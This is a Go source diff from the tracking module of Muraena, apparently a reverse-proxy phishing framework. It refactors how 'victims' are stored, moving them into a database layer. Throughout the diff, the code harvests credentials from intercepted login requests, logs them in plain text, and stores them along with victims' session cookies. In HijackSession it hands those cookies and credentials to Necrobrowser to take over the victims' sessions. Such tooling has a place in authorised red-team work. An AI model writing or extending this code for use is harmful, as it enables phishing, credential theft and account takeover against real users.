@@ -1,15 +1,16 @@
 package tracking
 
 import (
+	//"encoding/json"
 	"encoding/json"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"net/http"
 	"net/url"
 	"path"
 	"path/filepath"
 	"regexp"
 	"strings"
-	"sync"
 	"time"
 
 	"github.com/evilsocket/islazy/tui"
@@ -39,7 +40,7 @@ type Tracker struct {
 	Identifier     string
 	ValidatorRegex *regexp.Regexp
 
-	Victims sync.Map
+	//Victims sync.Map
 }
 
 // Trace object structure
@@ -265,8 +266,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	request.Header.Set("If-Range", t.ID)
 
 	// Check if the Trace ID is bind to an existing victim
-	v, err := module.GetVictim(t)
-	if err != nil {
+	v, _ := module.GetVictim(t)
+	if v.ID == "" {
 
 		// Tracking IP
 		IPSource := request.RemoteAddr
@@ -274,19 +275,23 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			IPSource = request.Header.Get(module.Session.Config.Tracking.IPSource)
 		}
 
-		var sm sync.Map
-		v := &Victim{
+		v := &db.Victim{
 			ID:           t.ID,
 			IP:           IPSource,
 			UA:           request.UserAgent(),
 			RequestCount: 1,
-			Cookies:      sm,
+			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
+			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
 		}
+
 		module.Push(v)
 		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
 
 	} else {
 		// This Victim is well known, increasing the number of requests processed
+		// TODO handle this with redis HINCRBY
+
+		// TODO update also the LastSeen time
 		v.RequestCount++
 	}
 
@@ -294,7 +299,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 }
 
 // TrackResponse tracks an HTTP Response
-func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
+func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {
 
 	// Do Not Track if not required
 	if !module.Enabled {
@@ -380,10 +385,17 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 							}
 						}
 
-						c := &VictimCredentials{p.Label, value, time.Now()}
-						victim.Credentials = append(victim.Credentials, c)
+						creds := &db.VictimCredential{
+							Key:   p.Label,
+							Value: value,
+							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
+						}
 
-						t.Info("[%s] New credentials! [%s:%s]", t.ID, c.Key, c.Value)
+						err := db.StoreVictimCreds(victim.ID, creds)
+						if err != nil {
+							return false, err
+						}
+						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
 						found = true
 					}
 				}
@@ -424,20 +436,21 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		return
 	}
 
-	//
-	// HIJACK!
-	//
-	var sessCookies []http.Cookie
-
 	// get all the cookies from the CookieJar
-	victim.Cookies.Range(func(k, v interface{}) bool {
-		_, c := k.(string), v.(http.Cookie)
-		sessCookies = append(sessCookies, c)
-		return true
-	})
+	cookiejar, err := db.GetVictimCookiejar(victim.ID)
+	if err != nil {
+		t.Error("error getting victim %s cookiejar: %s", victim.ID, err)
+	}
+
+	// get all the credentials
+	var credentials []db.VictimCredential
+	for i := 0; i < victim.CredsCount; i++ {
+		creds, _ := db.GetVictimCreds(victim.ID, i)
+		credentials = append(credentials, *creds)
+	}
 
 	// Pass credentials
-	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
+	creds, err := json.MarshalIndent(credentials, "", "\t")
 	if err != nil {
 		t.Warning(err.Error())
 	}
@@ -448,7 +461,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(sessCookies, string(creds))
+			go nb.Instrument(cookiejar, string(creds))
 		}
 	}
 
